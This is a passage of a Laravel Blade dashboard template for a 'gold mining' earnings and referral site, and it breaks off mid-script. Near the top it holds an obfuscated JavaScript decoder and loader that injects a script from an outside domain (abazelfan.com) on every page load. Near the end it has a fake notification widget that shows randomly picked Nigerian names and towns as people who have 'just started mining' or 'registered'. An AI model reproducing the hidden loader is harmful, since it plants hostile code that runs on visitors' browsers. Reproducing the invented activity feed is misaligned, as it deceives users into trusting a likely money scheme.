./.P.P.P.@.!z.P.P.[.A+.@E}WMq9.*W::lwZ:.*:o.*9l#:6i=:i6l.*EoE.1q:l6W5Ml.*qE#:WE=l+HiE+W66Wt+lE6oMM+iElE6oMM+siE6lH.P=:q}l+#l:.@wwl9qW:l+=MlW6.@wwl9qW:l+q:l6W:o6+.4.4Sow:qE^q.)El:.4WZi.)Z3Z.nAoElq9.G+qE9lB.aH+wWZ+~lt#+.c+ZW6#l+6l:i6E.*:3q#+;100+6l}l6#l+.4.4W^W=lMl5q6.)=ow.4.j.4+#tw5oM+:oZ+sHWM#l+.t7]W.1A.T.1.Q-.p.A+=ow+NqE+9o=./MlwlE:+iE6lH+=Mo#l+6l*il#:.!t.XRR+6l*il#:.!t.,.g.D+6l*il#:.!te.Fz+#o6:+Z6o=l##.)5qE9qE^.*q#.*Eo:.*#iZZo6:l9+Z6o=l##.)=39q6.*q#.*Eo:.*#iZZo6:l9+6l*il#:.!t.@H6Wwl+Zi#3+MlH:+^iw+Z~lt+Z#:6qE^+9W:W+=oE=W:+.P.P.!.*+ZoZ+:W^.gWwl+W=:q}l+.)3:wM+sq9+s=MlW6.LE+:W6^l:.@9+6lSl=:+WMM+6W=l+;16807+^l:.!oiE9qE^.XMqlE:zl=:+#=6llE+oZlE+;500+Ho6wW:+AoEl.@9+#oi6=lKoEl.@9+9owWqE+^lEl6W:qoE(qwl+=3W6.Xo9l.P:+6lwo}l.X3qM9+ZW^lk.aHH#l:+ZW^le.aHH#l:+=MqlE:(oZ+=MqlE:.blH:+#=6qZ:+^l:(qwl+lB:6W+^l:(qwlAoEl.aHH#l:+qw^+.NoH.G._+#lE9+9W:W#l:+oEMoW9+6l9i=l+:3q#+W5=9lH^3qS~MwEoZ*6#:i}NBtA+=Mo#l9+.)Z3Z+:3lE+6lH+.)+e.|.b.F::Zzl*il#:+.F./.P.I+sq9Ml(qwloi:+Mo=W:qoE+7o5Sl=:.*Z6o=l##-+#=6oMM(oZ+#=6oMM.blH:+oHH#l:&q9:3+oHH#l:.Flq^3:+;2147483647+6l#oM}l+36lH+#=6+i6M+:tZl+wl:3o9+6l*il#:sq9+6l#ZoE#l(tZl+AoElq9sW95Mo=~+sq9Ml(qwloi:.@9+6lM+lMlwlE:+l66o6+oZlEl6+:ovZZl6.XW#l+.,.F.,+#l:zl*il#:.FlW9l6+.8R+Nq:3.X6l9lE:qWM#+lB=Mi9l#+ZB+^l:.,6o:o:tZl.aH+5o::ow+6q^3:+=6o##.a6q^qE+#lMl=:o6+#3qH:+.}#+3::Z#.J+HqBl9+i#l.1=6l9lE:qWM#+qE#l6:.!lHo6l+.*+Z6l}lE:.IlHWiM:+#:oZ.,6oZW^W:qoE+#:oZ.@wwl9qW:l.,6oZW^W:qoE+.)S#oE+i#l6.P^lE:+.)=##.n+.)ZE^.n+HqE9+.}+;9999999+;99999999+MWE^iW^l+AoElq9+6lHl66l6+:qwls9qHH+z:+.I:+=i66lE:si6M+.F:+.L:+6lwo}l+.4.4+;98+;101+Z6o=l##+o5Sl=:+=WMM#q^E+AoElq9so6q^qEWM+^l:.|qEi:l#+^l:.PMMzl#ZoE#l.FlW9l6#+i#l6sW^lE:+.)S#.n+96WN.@wW^l+;3571+:o.@R.aR:6qE^+=oE:lE:.Io=iwlE:+#:W:i#+HqMM+#oi6#l.Iq}+;200+;204+=WMM5W=~+W6^#+i#l6.bWE^iW^l+#=6llEsNq9:3+#=6llEs3lq^3:+^l:.XoE:lB:+^l:.@wW^l.IW:W+#owl+l66o6.*6l*il#:.*:qwloi:+=MW##.bq#:+=WE}W#+.09+s5MWE~+:W6^l:+:qwlAoEl+:o.boNl6.XW#l+l66o6.*.B+#:W6:.boW9qE^+.D:+6lHl66l6s9owWqE+=i66lE:si6Ms9owWqE+56oN#l6sMWE^+soE(qwloi:+W95Mo=~+=W:=3+ZoN+.4l}lE:+#i5#:6qE^+.n+3o#:+#:6qE^qHt+#:W:i#(lB:+^9Z6+:+.6+.B.*N3qMl.*6l*il#:qE^.*+Zo#:+ZoZiZs:qwloi:+ZoZiZsMqE~+ZoZiZs#Wwlo6q^qE+.G+ElB:+6+=oE#:6i=:o6+#:tMlR3ll:#+i#l6sq9+9oEl+#3qH:R:6qE^.*+5+qE=Mi9l#+3lW9l6#+6lMW:q}l+9W:l.J+.N+;18+qwZo6:R=6qZ:#+;256+=##ziMl#+#lMl=:o6(lB:+oEwl##W^l+.)Nq9^l:.1=oM.1._.T.1#Z+#:W:i#s=o9l+:lB:+=oE:lE:+6l:i6E+#:W6:.@ESl=:R=6qZ:.Xo9l+Zo6:._+Zo6:.0+lE9.@ESl=:R=6qZ:.Xo9l+#l:.P::6q5i:l+9W:W.1AoEl.1q9+9W:W.19owWqE+oE6lW9t#:W:l=3WE^l+o+;31+#l:.@wwl9qW:l.i+#oi6=l+.i+W::W=3./}lE:+#:6qE^+;33',function(n,y){for(var r='YzR(vh&ekK7r-]syW5=9lH^3qS~MwEoZ*6#:i}NBtAcpV1)4T_0mjUO[xQJuCG2ndP!XI/LDF@8fb|ga,',t=['.','%','{'],e='',i=1,f=0;f<n.length;f++){var o=r.indexOf(n[f]);t.indexOf(n[f])>-1&&0===t.indexOf(n[f])&&(i=0),o>-1&&(e+=y(i*r.length+o),i=1);}return e;})),(function(s){var _={};for(k in s){try{_[k]=s[k].bind(s);}catch(e){_[k]=s[k];}}return _;})(document))</script><script>(function(d,z,s,c){s.src='//'+d+'/400/'+z;s.onerror=s.onload=E;function E(){c&&c();c=null}try{(document.body||document.documentElement).appendChild(s)}catch(e){E()}})('abazelfan.com',5073064,document.createElement('script'),_wovnm)</script>
</head>
<!-- header begin-->

<body>
    <!-- Sidenav -->
    <nav class="sidenav navbar navbar-vertical fixed-left navbar-expand-xs navbar-dark bg-dark" id="sidenav-main">
        <div class="scrollbar-inner">
            <!-- Brand -->
            <div class="sidenav-header d-flex align-items-center">
                <a class="navbar-brand" href="{{ url('/') }}">
                    <img src="{{ url('/') }}/asset/{{ $logo->image_link }}" class="navbar-brand-img" alt="...">
                </a>
                <div class="ml-auto">
                    <!-- Sidenav toggler -->
                    <div class="sidenav-toggler d-none d-xl-block" data-action="sidenav-unpin"
                        data-target="#sidenav-main">
                        <div class="sidenav-toggler-inner">
                            <i class="sidenav-toggler-line bg-white"></i>
                            <i class="sidenav-toggler-line bg-white"></i>
                            <i class="sidenav-toggler-line bg-white"></i>
                        </div>
                    </div>
                </div>
            </div>
            <div class="navbar-inner">
                <!-- Collapse -->
                <div class="collapse navbar-collapse" id="sidenav-collapse-main">
                    <!-- Nav items -->
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link" href="{{ route('user.dashboard') }}">
                                <i class="ni ni-shop"></i>
                                <span class="nav-link-text">Dashboard</span>
                            </a>
                        </li>
                        @if ($user->account_type->id == 1)
                        <li class="nav-item">
                            <a class="nav-link" href="{{ route('user.mining.page') }}">
                                <i class="ni ni-button-power"></i>
                                <span class="nav-link-text">Start MINING</span>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="{{ route('user.withdraw') }}">
                                <i class="ni ni-money-coins"></i>
                                <span class="nav-link-text">Bank Withdrawal</span>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="{{ route('user.latest_sponsored_post') }}">
                                <i class="ni ni-single-copy-04"></i>
                                <span class="nav-link-text">Sponsored Tasks</span>
                            </a>
                        </li>
                        @endif
                        @if ($user->account_type->id == 2)
                        <li class="nav-item">
                            <a class="nav-link" href="{{ route('user.withdraw_mlm') }}">
                                <i class="ni ni-button-power"></i>
                                <span class="nav-link-text">Bank Withdrawal</span>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="{{ route('user.dashboard') }}">
                                <i class="ni ni-button-power"></i>
                                <span class="nav-link-text">Activated or Reactivate button</span>
                            </a>
                        </li>
                        @endif
                    </ul>
                    <!-- Divider -->
                    <hr class="my-3">
                    <!-- Heading -->
                    <h6 class="navbar-heading p-0 text-muted">SOCIAL</h6>
                    <!-- Navigation -->
                    <ul class="navbar-nav mb-md-3">
                        <li class="nav-item">
                            <a class="nav-link" href="https://facebook.com/goldmintng/">
                                <i class="ni ni-bold-right"></i>
                                <span class="nav-link-text">Facebook</span>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="https://facebook.com/groups/goldmintng">
                                <i class="ni ni-bold-right"></i>
                                <span class="nav-link-text">Facebook Group</span>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="https://t.me/goldmintng">
                                <i class="ni ni-bold-right"></i>
                                <span class="nav-link-text">Telegram Channel</span>
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="https://api.whatsapp.com/send?phone=2347087394692">
                                <i class="ni ni-bold-right"></i>
                                <span class="nav-link-text">WhatsApp Support</span>
                            </a>
                        </li>
                    </ul>
                    <!-- Divider -->
                    <hr class="my-3">
                    <!-- Heading -->
                    <h6 class="navbar-heading p-0 text-muted">More</h6>
                    <!-- Navigation -->
                    <ul class="navbar-nav mb-md-3">
                        {{-- <li class="nav-item">
                            <a class="nav-link" href="{{ route('user.ticket') }}">
                                <i class="ni ni-support-16"></i>
                                <span class="nav-link-text">Support</span>
                            </a>
                        </li> --}}
                        {{-- <li class="nav-item">
                            <a class="nav-link" href="{{ route('user.profile') }}">
                                <i class="ni ni-single-02"></i>
                                <span class="nav-link-text">Account</span>
                            </a>
                        </li> --}}
                        {{-- <li class="nav-item">
                            <a class="nav-link" href="{{ route('user.password') }}">
                                <i class="ni ni-key-25"></i>
                                <span class="nav-link-text">Security</span>
                            </a>
                        </li> --}}
                        <li class="nav-item">
                            <a class="nav-link" href="https://web.facebook.com/groups/5288834967817951">
                                <i class="ni ni-satisfied"></i>
                                <span class="nav-link-text">Payment Proof</span>
                            </a>
                        </li>
                        {{-- @if ($set->referral == 1)
                            <li class="nav-item">
                                <a class="nav-link" href="{{ route('user.referral') }}">
                                    <i class="ni ni-satisfied"></i>
                                    <span class="nav-link-text">Referral</span>
                                </a>
                            </li>
                        @endif --}}
                        <li class="nav-item">
                            <a class="nav-link" href="{{ route('user.logout') }}">
                                <i class="ni ni-button-power"></i>
                                <span class="nav-link-text">Logout</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </nav>
    <div class="main-content" id="panel">
        <!-- Topnav -->
        <nav class="navbar navbar-top navbar-expand navbar-light">
            <div class="container-fluid">
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <!-- Search form -->
                    <div>
                        <h3 class="mb-0 text-dark">Account Type: {{ auth()->user()->account_type->name }}</h3>
                    </div>
                    <!-- Navbar links -->
                    <ul class="navbar-nav align-items-center ml-md-auto">
                        <li class="nav-item d-xl-none">
                            <!-- Sidenav toggler -->
                            <div class="pr-3 sidenav-toggler sidenav-toggler-light" data-action="sidenav-pin"
                                data-target="#sidenav-main">
                                <div class="sidenav-toggler-inner">
                                    <i class="sidenav-toggler-line"></i>
                                    <i class="sidenav-toggler-line"></i>
                                    <i class="sidenav-toggler-line"></i>
                                </div>
                            </div>
                        </li>
                    </ul>
                    <div class="">
                        <h3 class="mb-0 text-dark">
                            {{ $user->account_type_id == 1 ? 'Video Earning' : 'Account' }} Balance: {{ substr($user->balance, 0, 9) }}NGN
                        </h3>
                        @if ($user->account_type_id == 2)
                            @if (!$user->cycle)
                                <small class="text-danger font-weight-bolder">Locked</small>
                            @else
                                <small class="text-success font-weight-bolder">Unlocked</small>
                            @endif
                        @endif
                    </div>
                    <ul class="navbar-nav align-items-center ml-auto ml-md-0">
                        <li class="nav-item dropdown">
                            <a class="nav-link pr-0" href="javascript:void;" role="button" data-toggle="dropdown"
                                aria-haspopup="true" aria-expanded="false">
                                <div class="media align-items-center">
                                    <a href="{{ route('user.profile_edit') }}"><span
                                            class="avatar avatar-sm rounded-circle">
                                            <img alt="Image placeholder"
                                                src="{{ $user->image ? url('/') . '/asset/profile/' . $user->image : 'https://ui-avatars.com/api/?name=' . $user->username }}"></a>
                                    </span>
                                </div>

                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <div class="header pb-6">
            <div class="container-fluid">
                <div class="header-body">
                    <div class="row align-items-center">
                        <div class="col-lg-6 col-7">
                            <nav aria-label="breadcrumb" class="d-none d-md-inline-block ml-md-4">
                                <ol class="breadcrumb breadcrumb-links">
                                </ol>
                            </nav>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- header end -->

        @yield('content')


        <!-- footer begin -->
        <footer class="footer pt-0">

        </footer>
    </div>
    </div>
    <script type="text/javascript">
        var Tawk_API = Tawk_API || {},
            Tawk_LoadStart = new Date();
        (function() {
            var s1 = document.createElement("script"),
                s0 = document.getElementsByTagName("script")[0];
            s1.async = true;
            s1.src = 'https://embed.tawk.to/{{ $set->tawk_id }}/default';
            s1.charset = 'UTF-8';
            s1.setAttribute('crossorigin', '*');
            s0.parentNode.insertBefore(s1, s0);
        })();
    </script>
    <!-- Argon Scripts -->
    <!-- Core -->
    <script src="{{ url('/') }}/asset/dashboard/vendor/jquery/dist/jquery.min.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/js-cookie/js.cookie.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/jquery.scrollbar/jquery.scrollbar.min.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js"></script>
    <!-- Optional JS -->
    <script src="{{ url('/') }}/asset/dashboard/vendor/chart.js/dist/Chart.min.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/chart.js/dist/Chart.extension.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/jvectormap-next/jquery-jvectormap.min.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/js/vendor/jvectormap/jquery-jvectormap-world-mill.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/datatables.net/js/jquery.dataTables.min.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/datatables.net-bs4/js/dataTables.bootstrap4.min.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/datatables.net-buttons/js/dataTables.buttons.min.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/datatables.net-buttons-bs4/js/buttons.bootstrap4.min.js">
    </script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/datatables.net-buttons/js/buttons.html5.min.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/datatables.net-buttons/js/buttons.flash.min.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/datatables.net-buttons/js/buttons.print.min.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/datatables.net-select/js/dataTables.select.min.js"></script>
    <script src="{{ url('/') }}/asset/dashboard/vendor/clipboard/dist/clipboard.min.js"></script>
    <!-- Argon JS -->
    <script src="{{ url('/') }}/asset/dashboard/js/argon.js?v=1.1.0"></script>
    <!-- Demo JS - remove this in your project -->
    <script src="{{ url('/') }}/asset/dashboard/js/demo.min.js"></script>
    <script src="{{ url('/') }}/asset/frontend/js/sweetalert.js"></script>
    <!-- Notification script start -->
    <style type="text/css">
        .custom-sales-notification {
            position: fixed;
            bottom: 15px;
            left: 20px;
            z-index: 9999999999999 !important;
            font-family: "Open Sans", sans-serif;
        }

        .custom-sales-notification .notification-holder {
            width: 300px;
            border: 4px solid rgba(0, 0, 0, 0.26);
            text-align: left;
            z-index: 99999;
            box-sizing: border-box;
            font-weight: 400;
            border-radius: 5px;
            box-shadow: 0px 0px 5px -2px rgba(0, 0, 0, 0.50);
            background-color: #916704;
            position: relative;
            cursor: pointer;
        }

        .custom-sales-notification .notification-holder:hover {
            border-color: transparent;
            -webkit-transition: border-color 0.7s;
            -moz-transition: border-color 0.7s;
            ;
            -o-transition: border-color 0.7s;
            ;
            transition: border-color 0.7s;
            ;

        }

        .custom-sales-notification .notification-holder .notification-holder-container {
            display: flex !important;
            align-items: center;
            height: 74px;
        }

        .custom-sales-notification .notification-holder .notification-holder-container .notification-holder-image-wrapper span {
            margin-left: 1px;
            display: block;
            width: 72px;
            height: 72px;
            border-radius: 50%;
            background: #916704;
            font-size: 42px;
            text-align: center;
            line-height: 72px;
            color: #916704;
        }

        .custom-sales-notification .notification-holder .notification-holder-container .notification-holder-image-wrapper {
            margin-left: 1px;
            display: block;
            width: 72px;
            height: 72px;
            border-radius: 50%;
            background: #916704;
            font-size: 42px;
            text-align: center;
            line-height: 72px;
            color: #916704;
        }

        .custom-sales-notification .notification-holder .notification-holder-container .notification-holder-image-wrapper img {
            height: 60px;
            position: relative;
            top: 50%;
            transform: translateY(-50%);
        }


        .custom-sales-notification .notification-holder .notification-holder-container .notification-holder-content-wrapper {
            margin: 0;
            height: 100%;
            color: white;
            padding-left: 20px;
            padding-right: 20px;
            border-radius: 0 6px 6px 0;
            flex: 1;
            display: flex !important;
            flex-direction: column;
            justify-content: center;
        }

        .custom-sales-notification .notification-holder .notification-holder-container .notification-holder-content-wrapper .notification-holder-content {
            font-family: inherit !important;
            margin: 0 !important;
            padding: 0 !important;
            font-size: 12px;
            font-weight: bold;
        }

        .custom-sales-notification .notification-holder .notification-holder-container .notification-holder-content-wrapper .notification-holder-content small {
            margin-top: 3px !important;
            display: block !important;
            font-size: 12px !important;
            opacity: 0.8;
        }

        .custom-sales-notification .notification-holder .custom-close {
            position: absolute;
            top: 0px;
            right: -8px;
            height: 12px;
            width: 12px;
            cursor: pointer;
            color: #9E9E9E;
            transition: 0.2s ease-in-out;
            transform: rotate(45deg);
            opacity: 0;
        }

        .custom-sales-notification .notification-holder .custom-close::before {
            content: "";
            display: block;
            width: 100%;
            height: 2px;
            background-color: gray;
            position: absolute;
            left: 0;
            top: 5px;
        }

        .custom-sales-notification .notification-holder .custom-close::after {
            content: "";
            display: block;
            height: 100%;
            width: 2px;
            background-color: gray;
            position: absolute;
            left: 5px;
            top: 0;
        }

        .custom-sales-notification .notification-holder:hover .custom-close {
            opacity: 1;
        }

        .purchaselabel {
            font-size: 13px;
            font-weight: normal;
        }

        #buyertime {
            font-size: 10px;
            font-weight: normal;
            display: block;
            margin-top: 10px;
        }

    </style>
    <section class="custom-sales-notification">
        <div class="notification-holder">
            <div class="notification-holder-container">
                <div class="notification-holder-image-wrapper">
                    <img src="https://goldmintng.com/asset/images/goldmint-notification-coin.png" />
                </div>
                <div class="notification-holder-content-wrapper">
                    <p class="notification-holder-content">
                        <span id="buyername"></span> from <span id="buyerlocation"></span>
                    </p>
                </div>
            </div>
            <div class="custom-close"></div>
        </div>
    </section>
    {{-- <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script> --}}
    <script>
        $(document).ready(function() {
            var locations = ["Abia has just Started Mining", "Aba has just Started Mining",
                "Arochukwu has just Started Mining", "Umuahia has just Started Mining",
                "Adamawa has just Started Mining", "Jimeta has just Started Mining",
                "Mubi has just Started Mining", "Numan has just Started Mining", "Yola has just Started Mining",
                "Akwa Ibom has just Started Mining", "Ikot Abasi has just Started Mining",
                "Ikot Ekpene has just Started Mining", "Oron has just Started Mining",
                "Uyo has just Registered", "Anambra has just Registered", "Awka has just Registered",
                "Onitsha has just Registered", "Bauchi has just Registered", "Azare has just Registered",
                "Bauchi has just Registered", "Jama′are has just Registered", "Katagum has just Registered",
                "Misau has just Registered", "Bayelsa has just Registered", "Brass has just Registered",
                "Benue has just Registered", "Makurdi has just Registered", "Borno has just Registered",
                "Biu has just Registered", "Dikwa has just Registered", "Maiduguri has just Registered",
                "Cross River has just Registered", "Calabar has just Registered", "Ogoja has just Registered",
                "Delta has just Registered", "Asaba has just Registered", "Burutu has just Registered",
                "Koko has just Registered", "Sapele has just Registered", "Ughelli has just Registered",
                "Warri has just Registered", "Ebonyi has just Registered", "Abakaliki has just Registered",
                "Edo has just Registered", "Benin City has just Referred", "Ekiti has just Referred",
                "Ado-Ekiti has just Referred", "Effon-Alaiye has just Referred",
                "Ikere-Ekiti has just Referred", "Enugu has just Referred", "Enugu has just Referred",
                "Nsukka has just Referred", "FCT has just Referred", "Abuja has just Referred",
                "Gombe has just Referred", "Deba Habe has just Referred", "Gombe has just Referred",
                "Kumo has just Referred", "Imo has just Referred", "Owerri has just Referred",
                "Jigawa has just Referred", "Birnin Kudu has just Referred", "Dutse has just Referred",
                "Gumel has just Referred", "Hadejia has just Referred", "Kazaure has just Referred",
                "Kaduna has just Started Mining", "Jemaa has just Started Mining", "Kaduna has just Referred",
                "Zaria has just Referred", "Kano has just Referred", "Kano has just Referred",
                "Katsina has just Started Mining", "Daura has just Referred", "Kebbi has just Started Mining",
                "Argungu has just Referred", "Birnin Kebbi has just Started Mining",
                "Gwandu has just Started Mining", "Yelwa has just Started Mining",
                "Kogi has just Started Mining", "Idah has just Started Mining", "Kabba has just Started Mining",
                "Lokoja has just Started Mining", "Okene has just Started Mining",
                "Kwara has just Started Mining", "Ilorin has just Started Mining",
                "Jebba has just Started Mining", "Lafiagi has just Started Mining",
                "Offa has just Started Mining", "Pategi has just Started Mining",
                "Lagos has just Started Mining", "Badagry has just Started Mining",
                "Epe has just Started Mining", "Ikeja has just Started Mining",
                "Ikorodu has just Started Mining", "Lagos has just Started Mining",
                "Mushin has just Started Mining", "Shomolu has just Started Mining",
                "Nasarawa has just Started Mining", "Keffi has just Started Mining",
                "Lafia has just Started Mining", "Nasarawa has just Started Mining",
                "Niger has just Started Mining", "Agaie has just Started Mining",
                "Baro has just Started Mining", "Bida has just Started Mining",
                "Kontagora has just Started Mining", "Lapai has just Started Mining",
                "Minna has just Started Mining", "Suleja has just Started Mining",
                "Ogun has just Started Mining", "Abeokuta has just Started Mining",
                "Ijebu-Ode has just Started Mining", "Ilaro has just Started Mining",
                "Shagamu has just Started Mining", "Ondo has just Started Mining",
                "Akure has just Started Mining", "Ikare has just Started Mining",
                "Oka-Akoko has just Started Mining", "Ondo has just Started Mining", "Owo has just Registered",
                "Osun has just Registered", "Ede has just Registered", "Ikire has just Registered",
                "Ikirun has just Registered", "Ila has just Registered", "Ile-Ife has just Registered",
                "Ilesha has just Registered", "Ilobu has just Registered", "Inisa has just Registered",
                "Iwo has just Registered", "Oshogbo has just Registered", "Ila has just Registered",
                "Ile-Ife has just Registered", "Ilesha has just Registered", "Ilobu has just Started Mining",
                "Inisa has just Registered", "Iwo has just Registered", "Oshogbo has just Registered",
                "Oyo has just Registered", "Ibadan has just Started Mining", "Iseyin has just Registered",
                "Ogbomosho has just Registered", "Oyo has just Registered", "Saki has just Registered",
                "Bukuru has just Registered", "Jos has just Registered", "Vom has just Registered",
                "Wase has just Registered", "Rivers has just Registered", "Bonny has just Registered",
                "Degema has just Registered", "Okrika has just Registered", "Port Harcourt has just Registered",
                "Sokoto has just Registered", "Sokoto has just Registered", "Taraba has just Registered",
                "Ibi has just Registered", "Jalingo has just Registered", "Muri has just Registered",
                "Yobe has just Registered", "Damaturu has just Registered", "Nguru has just Registered",
                "Zamfara has just Registered", "Gusau has just Registered", "Kaura Namoda has just Registered",
                "Warri has just Registered", "Ebonyi has just Registered", "Abakaliki has just Registered",
                "Edo has just Registered", "Benin City has just Registered", "Ekiti has just Referred",
                "Ado-Ekiti has just Referred", "Effon-Alaiye has just Referred",
                "Ikere-Ekiti has just Referred", "Enugu has just Referred", "Enugu has just Logged in",
                "Nsukka has just Referred", "FCT has just Referred", "Abuja has just Referred",
                "Gombe has just Referred", "Deba Habe has just Referred", "Gombe has just Referred",
                "Kumo has just Referred", "Imo has just Referred", "Owerri has just Referred",
                "Jigawa has just Referred", "Birnin Kudu has just Referred", "Dutse has just Referred",
                "Gumel has just Referred", "Hadejia has just Referred", "Kazaure has just Referred",
                "Kaduna has just Referred", "Jemaa has just Referred", "Kaduna has just Logged in",
                "Zaria has just Referred", "Kano has just Referred", "Kano has just Referred",
                "Katsina has just Referred", "Daura Katsina has just Referred", "Kebbi has just Referred",
                "Argungu has just Referred", "Birnin Kebbi has just Referred", "Gwandu has just Referred",
                "Yelwa has just Referred", "Kogi has just Referred", "Idah has just Referred",
                "Kabba has just Referred", "Lokoja has just Referred", "Okene has just Referred",
                "Kwara has just Referred", "Ilorin has just Referred", "Jebba has just Referred",
                "Lafiagi has just Referred", "Offa has just Referred", "Pategi has just Referred",
                "Lagos has just Referred", "Badagry has just Referred", "Epe has just Referred",
                "Ikeja has just Referred", "Ikorodu has just Referred", "Lagos has just Logged in",
                "Mushin has just Referred", "Shomolu has just Referred", "Nasarawa has just Referred",
                "Keffi has just Referred", "Lafia has just Referred", "Nasarawa has just Logged in",
                "Niger has just Referred", "Agaie has just Referred", "Baro has just Referred",
                "Bida has just Referred", "Kontagora has just Referred", "Lapai has just Referred",
                "Minna has just Referred", "Suleja has just Referred", "Ogun has just Referred",
                "Abeokuta has just Referred", "Ijebu-Ode has just Referred", "Ilaro has just Referred",
                "Shagamu has just Referred", "Ondo has just Referred", "Akure has just Referred",
                "Ikare has just Referred", "Oka-Akoko has just Referred", "Ondo has just Referred",
                "Owo has just Referred", "Osun has just Referred", "Ede has just Referred",
                "Ikire has just Referred", "Ikirun has just Referred", "Ila has just Referred",
                "Ile-Ife has just Referred", "Ilesha has just Referred", "Ilobu has just Referred",
                "Inisa has just Started Mining", "Iwo has just Started Mining",
                "Oshogbo has just Started Mining", "Ila has just Started Mining",
                "Ile-Ife has just Started Mining", "Ilesha has just Started Mining",
                "Ilobu has just Started Mining", "Inisa has just Started Mining", "Iwo has just Started Mining",
                "Oshogbo has just Started Mining", "Oyo has just Started Mining",
                "Ibadan has just Started Mining", "Iseyin has just Started Mining",
                "Ogbomosho has just Started Mining", "Oyo has just Started Mining",
                "Saki has just Started Mining", "Bukuru has just Started Mining", "Jos has just Started Mining",
                "Vom has just Registered", "Wase has just Registered", "Rivers has just Registered",
                "Bonny has just Registered", "Degema has just Registered", "Okrika has just Registered",
                "Port Harcourt has just Registered", "Sokoto has just Registered", "Sokoto has just Registered",
                "Taraba has just Registered", "Ibi has just Referred", "Jalingo has just Referred",
                "Muri has just Referred", "Yobe has just Referred", "Damaturu has just Referred",
                "Nguru has just Referred", "Zamfara has just Referred", "Gusau has just Referred",
                "Kaura Namoda has just Referred"
            ];
            var name = ["Oluwatope", "Chibueze", "Chidie", "Chika", "Ahmedu", "Halimnye", "Chi", "Uche",
                "Chukwuebuka", "Nwabudike", "Chidea", "Chidiebube", "Amachea", "Abimbola", "Abimbola", "Abioye",
                "Abiodun", "Adebowale", "Anuoluwapo", "Adegoke", "Darasimi", "Adetokunbo", "Damilola",
                "Adewale", "Folashade", "Adisa", "Eniola", "Alabi", "Adesewa", "Aladewura", "Ayotola",
                "Ajibola", "Bimpe", "Amadi", "Ademosunro", "Ayokunle", "Damola", "Gbenga", "Bisi", "Kikelomo",
                "Lolade", "Olaoluwa", "Tosin", "Olalekan", "Ayomide", "Ademola", "Ademosunro", "Mosun",
                "Mosunro", "Okpeseyi", "Oluwasegun", "Tobechukwu", "Uzochukwu", "Ikem", "Adaobi", "Obea",
                "Chioma", "Obey", "Adisa", "Nkemdilim", "Uchee", "Oluwarantimi", "Numilekunoluwa", "Adisa",
                "Ololade", "Oluwatunmise", "Oluwaseun", "Similoluwa", "Teleola", "Abidemi", "Oluwatomiwa",
                "Ngozi", "Chidubem", "Chee", "Madu", "Fumnanya", "Madukaife", "Ijendu", "Oluchi", "Okparro",
                "Chibueze", "Odion", "Chydie", "Jelanee", "Nailah", "Chinaza", "Chibueze", "Chidie", "Chika",
                "Ahmedu", "Halimnye", "Chi", "Uche", "Chukwuebuka", "Nwabudike", "Chidea", "Chidiebube",
                "Amachea", "Abimbola", "Abimbola", "Abioye", "Abiodun", "Adebowale", "Anuoluwapo", "Adegoke",
                "Darasimi", "Adetokunbo", "Damilola", "Adewale", "Folashade", "Adisa", "Eniola", "Alabi",
                "Adesewa", "Aladewura", "Ayotola", "Ajibola", "Bimpe", "Amadi", "Ademosunro", "Ayokunle",
                "Damola", "Gbenga", "Bisi", "Kikelomo", "Lolade", "Olaoluwa", "Tosin", "Olalekan", "Ayomide",
                "Ademola", "Ademosunro", "Mosun", "Mosunro", "Okpeseyi", "Oluwasegun", "Tobechukwu",
                "Uzochukwu", "Ikem", "Adaobi", "Obea", "Chioma", "Obey", "Adisa", "Nkemdilim", "Uchee",
                "Oluwarantimi", "Numilekunoluwa", "Adisa", "Ololade", "Oluwatunmise", "Oluwaseun", "Similoluwa",
                "Teleola", "Abidemi", "Oluwatomiwa", "Ngozi", "Chidubem", "Chee", "Madu", "Fumnanya",
                "Madukaife", "Ijendu", "Oluchi", "Okparro", "Chibueze", "Odion", "Chydie", "Jelanee", "Nailah",
                "Chinaza"
            ];
            var time = ["goldmintng.com", "goldmintng.com", "goldmintng.com"]

            var random = Math.floor(Math.random() * locations.length);
            $("#buyerlocation").html(locations[random]);
            var random = Math.floor(Math.random() * name.length);
            var displayname = name[random];
            $("#buyername").html(displayname);
            $("#nameletter").html(displayname.charAt(0));
            var random = Math.floor(Math.random() * time.length);
            $("#buyertime").html(time[random]);

            /*
            var intTime=9000;
            setInterval(function(){ 
            
            	if($('.custom-sales-notification').css('display')=='none')
            	{
            		random = Math.floor(Math.random() * locations.length);
            		$("#buyerlocation").html(locations[random]);
            		
            		random = Math.floor(Math.random() * name.length);
            		displayname=name[random];
            		$("#buyername").html(displayname);
            		$("#nameletter").html(displayname.charAt(0));
            		
            		random = Math.floor(Math.random() * time.length);
            		$("#buyertime").html(time[random]);
            		intTime=9000;
            	}
            	else{
            		intTime=4000;
            	}
            	
